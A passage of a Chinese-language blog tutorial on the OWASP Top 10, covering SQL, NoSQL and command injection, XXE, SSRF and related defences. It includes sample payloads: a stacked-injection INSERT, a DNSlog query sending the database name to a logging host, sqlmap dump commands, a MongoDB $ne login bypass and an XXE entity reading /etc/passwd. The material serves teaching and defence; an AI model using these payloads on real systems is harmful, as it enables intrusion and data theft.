+<blockquote>
+<p>  在url编码中，0x -&gt; %，所以 0xdf -&gt; %df</p>
+</blockquote>
+<h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>​		多条 sql 语句一起执行</p>
+<h6 id="堆叠原理"><a href="#堆叠原理" class="headerlink" title="堆叠原理"></a>堆叠原理</h6><ul>
+<li>在 sql 中 ‘;’ 用来表示一条 sql 语句的结束，如果结束一条 sql 语句后在继续构造下一条语句，于是产生了堆叠注入，而<code>union</code>注入也是将两条语句合并在一起</li>
+<li>两者区别<ul>
+<li><code>union</code>注入，<code>union</code> 执行的语句类型是有限的，只能用来执行查询操作</li>
+<li>堆叠注入，<strong>可以执行任意的语句</strong>，如增删改查操作</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>  但是堆叠注入的使用会受到限制，如 api、数据库引擎、权限，只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query() 函数就可以支持多条sql语句同时执行。但在实际情况中，如PHP，为了防止堆叠注入机制，往往使用调用数据库的函数是mysqli_query() ,只能执行一条语句， ‘;’ 后的内容将不会被执行，所以堆叠注入的使用条件十分有限。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1; insert into users(id,username,password) value(100,&#x27;aa&#x27;,&#x27;bb&#x27;) -- -</span><br></pre></td></tr></table></figure>
+
+<h5 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h5><p>​		DNSlog 注入是一种高级的 sql 注入攻击技术，利用 DNS 解析过程中的特性，将恶意数据通过 DNS 请求传递到攻击者控制的 DNS 服务器，从而实现在无法直接获取响应的情况下，间接获取数据库信息的目的。</p>
+<h6 id="基本原理及步骤"><a href="#基本原理及步骤" class="headerlink" title="基本原理及步骤"></a>基本原理及步骤</h6><ul>
+<li><strong>构造恶意 sql 语句</strong>，构造包含恶意 sql 代码的语句，通常在语句中包含对 DNS 解析过程产生的 DNS 请求的利用代码</li>
+<li><strong>触发DNS解析</strong>，将构造的恶意 sql 代码注入到目标应用程序中，使其在处理用户请求时触发 DNS 解析</li>
+<li><strong>DNSlog服务</strong>，攻击者拥有一个控制的 DNS 服务器，该服务器能够记录接收到的 DNS 请求，并将记录的信息发送给攻击者</li>
+<li><strong>DNS记录信息</strong>，当应用程序触发 DNS 解析时，攻击者控制的 DNS 服务器会收到请求并记录相关信息，如恶意 sql 代码执行的结果</li>
+<li><strong>获取数据库信息</strong>，攻击者通过查看 DNS 服务器的记录，间接获取数据库执行恶意 sql 语句后的信息，包括可能的敏感信息</li>
+</ul>
+<p>​		DNSlog 注入的优势在于攻击者无需直接获取应用程序的响应，而是通过 DNS 请求的记录来获取信息，使攻击更为隐蔽。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select load_file(concat(&#x27;//&#x27;,(select database()),&quot;.abc.dnslog.cn/xxx.txt&quot;)) -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h4><ul>
+<li>关闭 SQL 错误回显</li>
+<li>使用成熟的 waf</li>
+<li>前端输入字符白名单验证</li>
+<li>SQL 服务运行于专门的账号，并且使用最小权限</li>
+<li>对输入的特殊字符使用转义处理</li>
+<li>参数化查询</li>
+<li>对于重要数据加密存储</li>
+</ul>
+<h4 id="SQLMap的使用"><a href="#SQLMap的使用" class="headerlink" title="SQLMap的使用"></a>SQLMap的使用</h4><h5 id="SQLMap介绍"><a href="#SQLMap介绍" class="headerlink" title="SQLMap介绍"></a>SQLMap介绍</h5><p>​		sqlmap 是一款由 Python 语言编写的开源渗透测试工具，主要用来检测和利用 sql 注入漏洞。</p>
+<blockquote>
+<p>  可以检测的数据库类型：access、mssql、mysql、oracle、postgresql、db2、sqlit等</p>
+<p>  可以进行的 sql 注入类型：盲注、union联合注入、post注入、cookie注入等</p>
+<p>  其他功能：数据导出、权限检测、自动破解、执行命令等</p>
+</blockquote>
+<h5 id="SQLMap使用步骤"><a href="#SQLMap使用步骤" class="headerlink" title="SQLMap使用步骤"></a>SQLMap使用步骤</h5><h6 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h6><p>​		使用 SQLMap 运行基本的检测命令，以确定目标网站是否存在 sql 注入漏洞，如果存在注入点，SQLMap将显示可用的数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-获取数据库版本"><a href="#2-获取数据库版本" class="headerlink" title="2. 获取数据库版本"></a>2. 获取数据库版本</h6><p>​		获取目标数据库版本，便于进行后续操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; --banner</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-获取当前用户"><a href="#3-获取当前用户" class="headerlink" title="3. 获取当前用户"></a>3. 获取当前用户</h6><p>​		确定当前数据库用户，明确当前权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; --current-user</span><br></pre></td></tr></table></figure>
+
+<h6 id="4-获取数据库"><a href="#4-获取数据库" class="headerlink" title="4. 获取数据库"></a>4. 获取数据库</h6><p>​		列举目标数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-获取指定数据库中的表"><a href="#5-获取指定数据库中的表" class="headerlink" title="5. 获取指定数据库中的表"></a>5. 获取指定数据库中的表</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; -D &#x27;目标数据库&#x27; --tables</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-获取指定表中的列"><a href="#6-获取指定表中的列" class="headerlink" title="6. 获取指定表中的列"></a>6. 获取指定表中的列</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; -D &#x27;目标数据库&#x27; -T &#x27;目标数据表&#x27; --columns</span><br></pre></td></tr></table></figure>
+
+<h6 id="7-获取指定表中数据"><a href="#7-获取指定表中数据" class="headerlink" title="7. 获取指定表中数据"></a>7. 获取指定表中数据</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;目标url&#x27; -D &#x27;目标数据库&#x27; -T &#x27;目标数据表&#x27; -C &#x27;co1,co2,...&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-NoSQL注入"><a href="#3-2-NoSQL注入" class="headerlink" title="3.2 NoSQL注入"></a>3.2 NoSQL注入</h3><p>​		NoSQL指的是非关系型数据库，也称作Not Only SQL 的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称，NoSQL用于超大规模数据的存储</p>
+<h4 id="NoSQL数据库分类"><a href="#NoSQL数据库分类" class="headerlink" title="NoSQL数据库分类"></a>NoSQL数据库分类</h4><ul>
+<li>文档型数据库 mongodb</li>
+<li>键值数据库 redis</li>
+<li>图形数据库</li>
+<li>列存储数据库 HBase、Riak、Druid</li>
+</ul>
+<h4 id="利用条件-Mongodb"><a href="#利用条件-Mongodb" class="headerlink" title="利用条件 - Mongodb"></a>利用条件 - Mongodb</h4><p>​		在MongoDB中，当应用程序未对用户输入进行严格验证和过滤时，攻击者可以利用一些特殊的查询条件来进行注入攻击。比如在查询条件中注入一些特殊字符或操作符，改变原始意图，以此来获取未授权的数据或执行恶意操作。</p>
+<h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><h5 id="永真式注入-万能密码"><a href="#永真式注入-万能密码" class="headerlink" title="永真式注入(万能密码)"></a>永真式注入(万能密码)</h5><p>​		以下通常为 PHP 的查询方式，以数组的方式插入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$collection</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​		由于 PHP 松散结构的特性，如果$_GET 传入的是数组，会自动被解析为字典，如：<code>?name[$ne]=1&amp;password[$ne]=1</code>，会被解析为以下格式：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;name&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;$ne&#x27;<span class="punctuation">:</span> &#x27;<span class="number">1</span>&#x27;</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;password&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;$ne&#x27;<span class="punctuation">:</span> &#x27;<span class="number">1</span>&#x27;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>​		相当于查询 name 不为1，并且 password 不为 1的用户，如果可以执行会返回所有用户的信息。</p>
+<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ul>
+<li><strong>数据泄露</strong>，攻击者可以获取敏感数据，包括用户信息、认证凭证等</li>
+<li><strong>数据篡改</strong>，攻击者可以修改数据库中的数据，造成数据损坏或错误</li>
+</ul>
+<h4 id="防护措施-2"><a href="#防护措施-2" class="headerlink" title="防护措施"></a>防护措施</h4><ul>
+<li><strong>输入验证</strong>，对用户输入进行严格验证和过滤，确保输入符合预期格式</li>
+<li><strong>参数化查询</strong>，使用参数化查询来构建数据库查询，而不是拼接字符串</li>
+<li><strong>最小权限原则</strong>，为数据库用户分配最小权限，避免过度权限</li>
+<li><strong>安全配置</strong>，确保数据库和应用程序都采取安全配置，比如禁止远程Root访问等</li>
+</ul>
+<h3 id="3-3-命令注入"><a href="#3-3-命令注入" class="headerlink" title="3.3 命令注入"></a>3.3 命令注入</h3><h4 id="命令注入原理"><a href="#命令注入原理" class="headerlink" title="命令注入原理"></a>命令注入原理</h4><p>​		应用有时需要调用一些执行系统命令的函数，如 PHP 中的 <code>system</code>、<code>exec</code>、<code>shell_exec</code>、<code>passthru</code>、<code>popen</code>、<code>proc_popen</code> 等，当用户能够控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令注入攻击。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>应用调用执行系统命令的函数</li>
+<li>将用户输入作为系统命令的参数，拼接到了命令行中</li>
+<li>没有对用户输入进行过滤，或过滤不严格</li>
+</ul>
+<h4 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h4><p>1 命令直接注入执行漏洞</p>
+<p>​		应用程序直接使用了危险的可执行系统命令的函数，如 PHP 的 <code>system</code>、<code>exec</code> 函数等，并且这些函数的运行参数是用户可控的，若过滤不严格，就会增大命令执行漏洞的概率。</p>
+<p>2 命令反序列化执行漏洞</p>
+<p>​		有些动态语言，如 PHP 支持实例对象的序列化传输，然后服务端将实例对象反序列化出来并执行解析后实例的构造函数、析构函数等，若这些函数利用了用户可控的参数，则会触发命令&#x2F;代码注入执行漏洞</p>
+<h4 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>​		继承 <code>web</code> 服务程序的权限去执行系统命令或读写文件，反弹 <code>shell</code> 控制整个网站，甚至控制服务器，进一步内网渗透</p>
+<ul>
+<li>控制受害主机，通过 RCE 执行任意操作</li>
+<li>窃取敏感信息，利用 RCE 窃取受害主机上的敏感信息，如密码、个人信息等</li>
+<li>破坏数据，如删除文件、格式化硬盘等</li>
+<li>传播恶意代码，在受害主机上安装恶意软件，从而进行更多的攻击</li>
+<li>滥用系统权限，获取受害主机的系统权限，从而进行更多攻击与滥用</li>
+</ul>
+<h4 id="防护措施-3"><a href="#防护措施-3" class="headerlink" title="防护措施"></a>防护措施</h4><ul>
+<li>应用程序应对所有输入数据进行充分的过滤和验证，包括但不限于用户输入、文件上传、cookie等</li>
+<li>使用安全的编程语言框架</li>
+<li>以最低的权限运行应用程序，减少攻击者获取服务器或系统的控制权可能性</li>
+<li>定期更新和修补程序，以消除漏洞</li>
+<li>使用 web 应用程序防火墙，检测和阻止恶意流量</li>
+<li>限制外部访问，确保 web 应用程序免受未经授权的访问和攻击</li>
+<li>记录和监控应用程序的所有操作，及时发现安全漏洞行为，以及进行对应的应急响应</li>
+<li>使用完整的加密和认证机制，保护应用程序的数据被窃取和篡改</li>
+<li>开发人员应该遵循安全开发实践，包括但不限于安全代码审计、安全测试、安全培训等</li>
+</ul>
+<h2 id="04-不安全的设计-Insecure-Design"><a href="#04-不安全的设计-Insecure-Design" class="headerlink" title="04 不安全的设计 - Insecure Design"></a>04 不安全的设计 - Insecure Design</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>​		在开发软件时，在关键身份验证、访问控制、业务逻辑和关键流部位没有进行安全的设计</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
+<li>支付逻辑<ul>
+<li>修改支付价格、状态、接口，修改购买数量</li>
+<li>多重支付、替代支付、最小额支付、最大额支付</li>
+<li>修改优惠卷、积分</li>
+</ul>
+</li>
+<li>密码找回</li>
+<li>验证码：暴力破解、重复使用、客户端回显、绕过、自动识别</li>
+</ul>
+<h3 id="防护措施-4"><a href="#防护措施-4" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>建立与使用安全开发生命周期，并且协同应用程序安全的专业人员进行评估与设计安全与隐私相关的控制措施</li>
+<li>建立与使用安全设计模式的函数库，或完整安全的组件</li>
+<li>在应用程序的每一层都集成合理性校验(从前端到后端)</li>
+<li>将威胁建模运用在关键身份认证、访问控制、业务逻辑和关键流</li>
+<li>编写单元测试与集成测试，以验证所有的关键流程对威胁建模都有效</li>
+</ul>
+<h2 id="05-安全配置错误-Security-Misconfiguration"><a href="#05-安全配置错误-Security-Misconfiguration" class="headerlink" title="05 安全配置错误 - Security Misconfiguration"></a>05 安全配置错误 - Security Misconfiguration</h2><h3 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h3><p>​		安全配置错误是最常见的安全问题，通常由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置，以及包含敏感信息的详细错误信息所造成的。因此，不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级操作。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
+<li>应用程序启用或安装了不必要的安全功能</li>
+<li>默认账户名和密码没有修改</li>
+<li>应用软件已过期或推出新的版本未更新</li>
+<li>应用程序框架、服务器等未进行安全配置</li>
+<li>错误处理机制披露大量敏感信息</li>
+<li>对于系统的更新，禁用或不安全地配置安全功能</li>
+</ul>
+<h3 id="防护措施-5"><a href="#防护措施-5" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>按照安全手册进行加固</li>
+<li>搭建最小化平台，不包含任何不必要的功能、组件、文档和实例，移除或不安装不适用的功能和框架</li>
+<li>临时文件及时删除</li>
+</ul>
+<h3 id="XXE-XML-外部实体注入攻击"><a href="#XXE-XML-外部实体注入攻击" class="headerlink" title="XXE(XML 外部实体注入攻击)"></a>XXE(XML 外部实体注入攻击)</h3><p>​		XXE注入，即 XML External Entity，XML 外部实体注入，XXE漏洞发生在应用程序解析输入的 XML 时，没有禁止外部实体的加载，导致可以加载恶意外部文件，造成文件读取、命令执行等攻击。</p>
+<h4 id="XXE危害"><a href="#XXE危害" class="headerlink" title="XXE危害"></a>XXE危害</h4><ul>
+<li>任意文件读取</li>
+<li>内网端口探测</li>
+<li>拒绝服务攻击</li>
+</ul>
+<h4 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XXE</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">cmd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">]&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;- 读取/etc/passwd中的内容 -&gt;</span></span><br><span class="line"><span class="meta">&amp;cmd;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h4><ul>
+<li>禁用外部实体，在解析 XML 文档时，可以禁用外部实体解析功能，以防攻击者注入恶意实体</li>
+<li>使用安全的解析器可以降低 XXE 漏洞的风险</li>
+<li>在接收 XML 数据时，应对输入数据进行验证，过滤恶意实体和 DTD 文件等</li>
+<li>在 HTTP 响应头中增加 X-Content-Type-Options 和Content-Security</li>
+<li>在处理 XML 数据时，应使用白名单来限制实体和属性的值，只允许合法的输入</li>
+<li>及时更新 Web 应用程序和相关组件的安全补丁，以修复已知的 XXE 漏洞</li>
+<li>合理配置 Web 服务器和 Web 应用程序的安全策略，如限制文件上传、禁止目录列表等</li>
+</ul>
+<h2 id="06-使用易受攻击和过时的组件-Vulnerable-and-Outdated-Components"><a href="#06-使用易受攻击和过时的组件-Vulnerable-and-Outdated-Components" class="headerlink" title="06 使用易受攻击和过时的组件 - Vulnerable and Outdated Components"></a>06 使用易受攻击和过时的组件 - Vulnerable and Outdated Components</h2><p>​		如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器崩溃。同时，使用含有已知漏洞的组件的应用程序和 api 可能会破坏应用程序防御、造成各种攻击并产生严重的影响。</p>
+<h3 id="弱点描述-2"><a href="#弱点描述-2" class="headerlink" title="弱点描述"></a>弱点描述</h3><ul>
+<li>软件易受攻击，不再支持或者过时</li>
+<li>没有对更新的、升级的或打过补丁的组件进行兼容性测试</li>
+</ul>
+<h3 id="防护措施-6"><a href="#防护措施-6" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>移除不使用的依赖、不需要的功能、组件、文件和文档</li>
+<li>仅从官方的渠道获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</li>
+<li>持续关注 CVE 和 CVND 等是否发布已使用组件的漏洞信息，可以使用软件分析工具自动完成，订阅关于使用组件安全漏洞告警的邮件</li>
+</ul>
+<h2 id="07-识别和身份验证失败-Identification-and-Authentication-Failures"><a href="#07-识别和身份验证失败-Identification-and-Authentication-Failures" class="headerlink" title="07 识别和身份验证失败 - Identification and Authentication Failures"></a>07 识别和身份验证失败 - Identification and Authentication Failures</h2><p>​		通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
+<p>​		在开发 web 应用程序时，开发人员往往只关注 web 应用程序所需的功能，所以常常会建立自定义的认证和会话方案。但是要正确的实现这些方案很难，结果就是在退出、密码管理、超时、密码找回、账户更新等方面存在漏洞。</p>
+<h3 id="弱点描述-3"><a href="#弱点描述-3" class="headerlink" title="弱点描述"></a>弱点描述</h3><ul>
+<li>暴力破解密码</li>
+<li>存储默认的、弱的账户、密码</li>
+<li>使用明文、加密或弱散列密码</li>
+<li>缺少或缺失多因素身份验证</li>
+<li>暴露 url 中的会话 id</li>
+<li>旧密码泄露</li>
+<li>会话 id 使用时间过长</li>
+</ul>
+<h3 id="防护措施-7"><a href="#防护措施-7" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>在可能的情况下，实现多因素身份验证，以防范自动、凭证填充暴力破解和被盗用凭证再利用攻击</li>
+<li>检查弱口令，模拟爆破操作</li>
+<li>限制或主键延迟失败的登陆尝试，记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员</li>
+<li>使用服务器端安全的内置会话管理器，在登陆后生成高度复杂的新随机会话 id。会话 id不能在 url 中，可以安全地存储和当登出闲置、绝对超时后使其失效</li>
+</ul>
+<h2 id="08-软件和数据完整性故障-Software-and-Data-Integrity-Failures"><a href="#08-软件和数据完整性故障-Software-and-Data-Integrity-Failures" class="headerlink" title="08 软件和数据完整性故障 - Software and Data Integrity Failures"></a>08 软件和数据完整性故障 - Software and Data Integrity Failures</h2><p>​		软件和数据完整性故障与不能防范完整性违规的代码和基础设施有关，一个例子是，应用程序依赖来自不受信任的来源、存储库和内容交付网络(CDN)的插件、库或模块。不安全的CI&#x2F;CD管道可能会导致未经授权的访问、恶意点或系统受损。最后，许多应用程序现在包括自动更新功能，其中更新在没有充分完整性验证的情况下，被下载并运行于以前受信任的应用程序，攻击者可能会上传自己的更新以分发在所有安装上运行；另一个例子是，对象或数据被编码或序列化为攻击者可以看到和修改的结构，容易受到不安全的反序列化。</p>
+<h3 id="防护措施-8"><a href="#防护措施-8" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>使用数字签名或类似机制来验证软件或数据来自预期来源且未被更改</li>
+<li>确保使用安全工具验证组件不包含已知漏洞</li>
+<li>确保未签名或未加密的序列化数据不会在没有检查或数字签名的情况下发送到不受信任的客户端</li>
+</ul>
+<h2 id="09-安全日志记录和监控故障-Security-Logging-and-Monitoring-Failures"><a href="#09-安全日志记录和监控故障-Security-Logging-and-Monitoring-Failures" class="headerlink" title="09 安全日志记录和监控故障 - Security Logging and Monitoring Failures"></a>09 安全日志记录和监控故障 - Security Logging and Monitoring Failures</h2><p>​		不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。</p>
+<p>​		大多数缺陷研究表示，缺陷被检测出来的时间超过 200 天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
+<h3 id="防护措施-9"><a href="#防护措施-9" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>确保所有登陆、访问控制失败、输入验证失败能够被记录到日志中，并保留足够的用户上下文信息，以识别可疑或恶意账户，并为后期取证预留足够时间</li>
+<li>确保日志以一种能被集中日志管理解决方案使用的形式生成</li>
+<li>确保高额交易有完整性控制的审计信息，以防止篡改或删除</li>
+<li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对</li>
+</ul>
+<h2 id="10-服务器请求伪造-Server-Side-Request-Forgery-SSRF"><a href="#10-服务器请求伪造-Server-Side-Request-Forgery-SSRF" class="headerlink" title="10 服务器请求伪造 - Server Side Request Forgery(SSRF)"></a>10 服务器请求伪造 - Server Side Request Forgery(SSRF)</h2><p>​		SSRF 是指攻击者能够从易受攻击的 web 应用程序发送请求对其他网站进行攻击，一般来说，<strong>SSRF攻击的目标是从外网无法访问的内部系统</strong>，利用一个可以发起网络请求的服务，当做跳板来攻击其他服务。</p>
+<p>​		SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。SSRF 是利用存在缺陷的 web 应用作为代理去攻击远程或本地的服务器。也就是说，对于服务器提供服务的其他应用没有对访问进行限制，如果使用构造好的访问包，就有可能利用目标服务对其他服务器应用进行调用。</p>
+<h3 id="SSRF常见危害"><a href="#SSRF常见危害" class="headerlink" title="SSRF常见危害"></a>SSRF常见危害</h3><ul>
+<li>可以对服务器所在内网、本地进行端口扫描，获取一些服务的信息等</li>
+<li>目标网站本地敏感数据的读取</li>
+<li>内外网主机应用程序漏洞的利用</li>
+<li>内外网 web 站点漏洞的利用</li>
+</ul>
+<h3 id="防护措施-10"><a href="#防护措施-10" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>过滤返回信息，验证远程服务器对请求的响应。如果 web 应用获取某种类型的文件，那么可以在把返回结果展示给用户之前先验证返回信息是否符合标准</li>
+<li>统一错误信息，避免用户根据错误信息来判断远程服务器端口状态</li>
+<li>限制请求的端口为 HTTP 常用端口，如 80、443、8080</li>
+<li>黑名单内网 ip，避免应用被用来获取内网数据，攻击内网</li>
+<li>禁用不需要的协议，仅允许 HTTP 和 HTTPS 请求，防范类似 file:&#x2F;&#x2F; 、ftp:&#x2F;&#x2F; 等引起的问题</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://crappier.github.io">fanhao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://crappier.github.io/2024/03/06/OWASP-TOP-10/">https://crappier.github.io/2024/03/06/OWASP-TOP-10/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://crappier.github.io" target="_blank">Depicter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover_2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="渗透测试"><img class="cover" src="/img/cover/cover_9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/20/Django%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86%E7%82%B9/" title="Django开发知识点"><img class="cover" src="/img/cover/cover_6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Django开发知识点</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/06/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/" title="常用网络安全设备"><img class="cover" src="/img/cover/cover_6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="title">常用网络安全设备</div></div></a></div><div><a href="/2024/03/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="渗透测试"><img class="cover" src="/img/cover/cover_9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="title">渗透测试</div></div></a></div><div><a href="/2024/03/12/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="Nmap使用指南"><img class="cover" src="/img/cover/cover_2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-12</div><div class="title">Nmap使用指南</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fanhao</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" 